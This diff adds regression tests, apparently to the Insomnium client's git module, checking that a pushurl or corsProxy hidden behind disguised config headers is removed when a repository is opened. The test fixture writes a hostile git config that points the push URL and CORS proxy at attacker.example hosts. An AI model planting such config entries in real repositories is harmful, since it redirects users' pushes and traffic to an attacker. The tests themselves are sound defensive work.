@@ -74,6 +74,45 @@ describe('the internal git dir', () => {
     expect(await git.getConfig({ ...opts, path: 'remote.origin.pushurl' })).toBeUndefined();
     expect(await git.getConfig({ ...opts, path: 'http.corsProxy' })).toBeUndefined();
   });
+
+  // isomorphic-git's parser gives a header the section's path, so unsetting the
+  // key would drop the header and re-parent the lines below into [remote "origin"]
+  it.each([
+    ['a quoted subsection with a dot', '[remote "origin.pushurl"]', '[http "corsproxy"]'],
+    ['a legacy dotted header', '[remote.origin.pushurl]', '[http.corsProxy]'],
+  ])('is cleaned of a pushurl or corsProxy hidden behind %s', async (_, pushHeader, proxyHeader) => {
+    const { gitData, opts } = appLayout();
+    await git.init({ ...opts, defaultBranch: 'main' });
+    await gitData.promises.writeFile(`${GIT_INTERNAL_DIR}/config`, [
+      '[core]', '\trepositoryformatversion = 0', '\tbare = false',
+      '[remote "origin"]', '\turl = https://github.com/owner/repo.git', '\tfetch = +refs/heads/*:refs/remotes/origin/*',
+      pushHeader, '\tpushurl = https://attacker.example/steal.git',
+      '[http]', proxyHeader, '\tcorsProxy = https://attacker.example/proxy', '',
+    ].join('\n'));
+
+    // what gitRepoAction does when it opens the repo
+    await GitVCS.init({ uri: '', repoId: '', directory: GIT_CLONE_DIR, fs: opts.fs, gitDirectory: GIT_INTERNAL_DIR });
+    await GitVCS.setAuthor('a', 'a@example.com');
+    await GitVCS.addRemote('https://github.com/owner/repo.git');
+
+    expect(await git.getConfig({ ...opts, path: 'remote.origin.pushurl' })).toBeUndefined();
+    expect(await git.getConfig({ ...opts, path: 'http.corsProxy' })).toBeUndefined();
+    expect(await git.getConfig({ ...opts, path: 'remote.origin.url' })).toBe('https://github.com/owner/repo.git');
+  });
+
+  it('leaves a config Insomnium wrote untouched', async () => {
+    const { gitData, opts } = appLayout();
+    await git.init({ ...opts, defaultBranch: 'main' });
+    await git.addRemote({ ...opts, remote: 'origin', url: 'https://github.com/owner/repo.git' });
+    await git.setConfig({ ...opts, path: 'user.name', value: 'a' });
+    await git.setConfig({ ...opts, path: 'branch.main.remote', value: 'origin' });
+    await git.setConfig({ ...opts, path: 'branch.main.merge', value: 'refs/heads/main' });
+    const before = (await gitData.promises.readFile(`${GIT_INTERNAL_DIR}/config`)).toString();
+
+    await GitVCS.init({ uri: '', repoId: '', directory: GIT_CLONE_DIR, fs: opts.fs, gitDirectory: GIT_INTERNAL_DIR });
+
+    expect((await gitData.promises.readFile(`${GIT_INTERNAL_DIR}/config`)).toString()).toBe(before);
+  });
 });
 
 describe('a pulled commit on disk', () => {
